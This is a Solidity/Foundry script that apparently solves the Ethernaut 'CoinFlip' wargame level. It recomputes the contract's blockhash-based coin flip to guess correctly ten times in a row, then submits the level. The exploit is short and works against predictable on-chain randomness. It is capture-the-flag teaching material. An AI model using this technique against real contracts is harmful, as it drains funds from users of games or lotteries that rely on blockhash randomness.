// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import {Ethernaut} from './base.sol';
import 'forge-std/Test.sol';

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlip is Ethernaut {
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function run() public {
    vm.roll(block.number - 10);
    vm.startBroadcast();

    // Create Instance
    ICoinFlip coinFlip = ICoinFlip(createNewInstance(COIN_FLIP));

    // Task
    for (uint i = 0; i < 10; i++) {
      coinFlip.flip(correctGuess());
      vm.roll(block.number + 1);
    }

    // Submission
    submitInstance(COIN_FLIP, address(coinFlip));

    vm.stopBroadcast();
  }

  function correctGuess() internal view returns (bool) {
    // Copy the code given 
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return side;
  }
}